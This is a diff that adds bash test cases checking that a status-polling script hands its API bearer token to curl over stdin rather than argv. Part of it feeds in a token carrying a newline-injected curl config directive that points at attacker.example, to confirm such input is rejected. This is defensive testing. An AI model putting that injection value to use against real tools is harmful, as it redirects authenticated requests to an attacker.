@@ -193,5 +193,47 @@ else
   fail "sleep call count must be 4 (0 residual + 4 deadline)" "$n" "counted=$n"
 fi
 
+# ── the bearer rides curl's STDIN config channel, never argv ────────────────────────────────
+# The cases above use the REGISTRY_HB_STATUS_CMD seam and never reach curl. These run the real
+# curl path against a PATH shim that records argv (NUL-delimited) and stdin, with a synthetic token.
+SHIM="$TMP/shim"; mkdir -p "$SHIM"
+cat > "$SHIM/curl" <<'SHIM_EOF'
+#!/usr/bin/env bash
+d="${CURL_SHIM_DIR:?}"
+n=$(cat "$d/n" 2>/dev/null || echo 0); n=$((n+1)); printf '%s' "$n" > "$d/n"
+printf '%s\0' "$@" > "$d/argv.$n"
+cat > "$d/stdin.$n"
+if (( n == 1 )); then printf '{"data":{"attributes":{"status":"down"}}}'; else printf '{"data":{"attributes":{"status":"up"}}}'; fi
+SHIM_EOF
+chmod +x "$SHIM/curl"
+SYN_TOKEN="synthetic-hb-token-0123"
+run_curl_path() {  # $1 = token ; echoes combined output
+  rm -rf "$TMP/rec"; mkdir -p "$TMP/rec"
+  PATH="$SHIM:$PATH" CURL_SHIM_DIR="$TMP/rec" BETTERSTACK_API_TOKEN="$1" \
+    REGISTRY_HB_SLEEP_CMD="$SLEEP_STUB" REGISTRY_HB_RESIDUAL_S=30 REGISTRY_HB_DEADLINE_S=40 \
+    REGISTRY_HB_INTERVAL_S=10 bash "$POLL" "$TMP/tfstate.json" 2>&1
+}
+out="$(run_curl_path "$SYN_TOKEN")"; rc=$?
+argv_all="$(cat "$TMP"/rec/argv.* 2>/dev/null | tr '\0' ' ')"
+if [[ "$rc" -eq 0 && -s "$TMP/rec/stdin.1" \
+  && "$(cat "$TMP/rec/stdin.1")" == "header = \"Authorization: Bearer ${SYN_TOKEN}\"" \
+  && "$argv_all" != *"$SYN_TOKEN"* && "$argv_all" != *"Authorization"* && "$argv_all" != *"Bearer"* \
+  && "$(tr '\0' ' ' < "$TMP/rec/argv.1")" == "--disable --noproxy * "* \
+  && "$argv_all" == *"--config -"* ]]; then
+  pass "curl path: bearer header on stdin, token absent from every argv, --disable first"
+else
+  fail "curl path must carry the bearer on stdin only" "$rc" "argv=[${argv_all}] out=${out}"
+fi
+
+# An unusable token (newline would inject a curl config directive; empty) => zero curl calls, rc!=0.
+for bad in $'abc\nurl = "https://attacker.example/"' ""; do
+  out="$(run_curl_path "$bad")"; rc=$?
+  if [[ "$rc" -ne 0 && ! -e "$TMP/rec/n" ]]; then
+    pass "unusable token => zero curl calls and non-success rc (rc=$rc)"
+  else
+    fail "unusable token must make zero curl calls and fail" "$rc" "calls=$(cat "$TMP/rec/n" 2>/dev/null) out=${out}"
+  fi
+done
+
 printf '\n=== %d passed, %d failed ===\n\n' "$passes" "$fails"
 [[ "$fails" -eq 0 ]]
